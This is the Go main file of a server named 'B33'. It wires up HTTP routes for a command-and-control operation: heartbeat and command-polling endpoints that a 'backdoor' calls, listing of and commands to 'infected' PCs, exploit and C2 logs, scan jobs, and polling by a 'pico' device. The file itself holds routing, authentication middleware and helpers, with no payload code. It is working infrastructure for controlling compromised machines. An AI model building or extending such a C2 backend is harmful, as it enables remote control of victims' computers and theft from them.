package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

func main() {
	cfg, err := LoadConfig()
	if err != nil {
		log.Fatalf("Configuration error: %v", err)
	}

	db := NewD1Client(cfg.CFAccountID, cfg.D1DatabaseID, cfg.CFAPIToken)

	// Initialize handlers
	authHandler := &AuthHandler{Config: cfg}
	scanHandler := &ScanHandler{DB: db}
	taskHandler := &TaskHandler{DB: db}
	picoHandler := &PicoHandler{DB: db}
	c2Handler := &C2Handler{DB: db}
	logHandler := &LogHandler{DB: db}

	mux := http.NewServeMux()

	// Health check - no auth
	mux.HandleFunc("/api/health", func(w http.ResponseWriter, r *http.Request) {
		writeJSON(w, http.StatusOK, APIResponse{Success: true, Message: "B33 server is running"})
	})

	// Auth - no auth needed
	mux.HandleFunc("/api/auth/login", authHandler.HandleLogin)

	// Scans - JWT required (web interface)
	mux.Handle("/api/scans/private", JWTAuthMiddleware(cfg.JWTSecret, http.HandlerFunc(scanHandler.HandlePrivateScans)))
	mux.Handle("/api/scans/private/", JWTAuthMiddleware(cfg.JWTSecret, http.HandlerFunc(scanHandler.HandlePrivateScans)))
	mux.Handle("/api/scans/public", JWTAuthMiddleware(cfg.JWTSecret, http.HandlerFunc(scanHandler.HandlePublicScans)))
	mux.Handle("/api/scans/public/", JWTAuthMiddleware(cfg.JWTSecret, http.HandlerFunc(scanHandler.HandlePublicScans)))

	// Tasks - JWT required (web creates tasks) or API key (pico updates tasks)
	mux.Handle("/api/tasks", EitherAuthMiddleware(cfg.JWTSecret, cfg.APIKey, http.HandlerFunc(taskHandler.HandleTasks)))
	mux.Handle("/api/tasks/", EitherAuthMiddleware(cfg.JWTSecret, cfg.APIKey, http.HandlerFunc(taskHandler.HandleTasks)))

	// Pico polling - API key required
	mux.Handle("/api/pico/poll", APIKeyAuthMiddleware(cfg.APIKey, http.HandlerFunc(picoHandler.HandlePoll)))

	// C2 - Heartbeat and commands use API key (backdoor calls these)
	mux.Handle("/api/c2/heartbeat", APIKeyAuthMiddleware(cfg.APIKey, http.HandlerFunc(c2Handler.HandleHeartbeat)))
	mux.Handle("/api/c2/commands/", APIKeyAuthMiddleware(cfg.APIKey, http.HandlerFunc(c2Handler.HandleCommands)))

	// C2 - Infected PC management: either JWT (web interface) or API key
	mux.Handle("/api/c2/infected", EitherAuthMiddleware(cfg.JWTSecret, cfg.APIKey, http.HandlerFunc(c2Handler.HandleInfected)))
	mux.Handle("/api/c2/infected/", EitherAuthMiddleware(cfg.JWTSecret, cfg.APIKey, http.HandlerFunc(c2Handler.HandleInfected)))

	// Logs - JWT required (web interface)
	mux.Handle("/api/logs/exploits", JWTAuthMiddleware(cfg.JWTSecret, http.HandlerFunc(logHandler.HandleExploitLogs)))
	mux.Handle("/api/logs/c2", JWTAuthMiddleware(cfg.JWTSecret, http.HandlerFunc(logHandler.HandleC2Logs)))

	// Serve static web files if directory exists
	webDir := os.Getenv("WEB_DIR")
	if webDir == "" {
		webDir = "web"
	}
	if info, err := os.Stat(webDir); err == nil && info.IsDir() {
		log.Printf("Serving web UI from %s", webDir)
		mux.Handle("/", spaFileHandler(webDir))
	}

	// Apply global middleware: CORS, then logging
	handler := CORSMiddleware(LoggingMiddleware(mux))

	addr := ":" + cfg.Port
	log.Printf("B33 server starting on %s", addr)
	log.Printf("Endpoints:")
	log.Printf("  POST   /api/auth/login          (no auth)")
	log.Printf("  GET    /api/health               (no auth)")
	log.Printf("  GET    /api/scans/private         (JWT)")
	log.Printf("  POST   /api/scans/private         (JWT)")
	log.Printf("  GET    /api/scans/public          (JWT)")
	log.Printf("  POST   /api/scans/public          (JWT)")
	log.Printf("  GET    /api/tasks                 (JWT/API key)")
	log.Printf("  POST   /api/tasks                 (JWT)")
	log.Printf("  PATCH  /api/tasks/{id}            (JWT/API key)")
	log.Printf("  POST   /api/pico/poll             (API key)")
	log.Printf("  POST   /api/c2/heartbeat          (API key)")
	log.Printf("  GET    /api/c2/commands/{pc_id}   (API key)")
	log.Printf("  GET    /api/c2/infected           (JWT/API key)")
	log.Printf("  POST   /api/c2/infected/{id}/command (JWT)")
	log.Printf("  GET    /api/logs/exploits         (JWT)")
	log.Printf("  GET    /api/logs/c2               (JWT)")

	if err := http.ListenAndServe(addr, handler); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}

// --- Helper functions ---

func writeJSON(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

func extractPathParam(path, prefix string) string {
	sub := strings.TrimPrefix(path, prefix)
	// Remove trailing slashes and get the first segment
	sub = strings.TrimSuffix(sub, "/")
	if sub == "" {
		return ""
	}
	parts := strings.SplitN(sub, "/", 2)
	return parts[0]
}

func itoa(i int) string {
	return strconv.Itoa(i)
}

func ptr(s string) *string {
	return &s
}

func deref(s *string) string {
	if s == nil {
		return ""
	}
	return *s
}

// jsonPretty returns pretty-printed JSON (for debugging).
func jsonPretty(v interface{}) string {
	b, _ := json.MarshalIndent(v, "", "  ")
	return string(b)
}

// spaFileHandler serves static files from dir, falling back to index.html for SPA routing.
func spaFileHandler(dir string) http.Handler {
	fs := http.Dir(dir)
	fileServer := http.FileServer(fs)
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Try to serve the requested file
		path := filepath.Clean(r.URL.Path)
		if path == "/" {
			path = "/index.html"
		}
		if _, err := os.Stat(filepath.Join(dir, path)); err == nil {
			fileServer.ServeHTTP(w, r)
			return
		}
		// File not found - serve index.html for SPA routing
		http.ServeFile(w, r, filepath.Join(dir, "index.html"))
	})
}

// unused but needed by fmt import
var _ = fmt.Sprintf
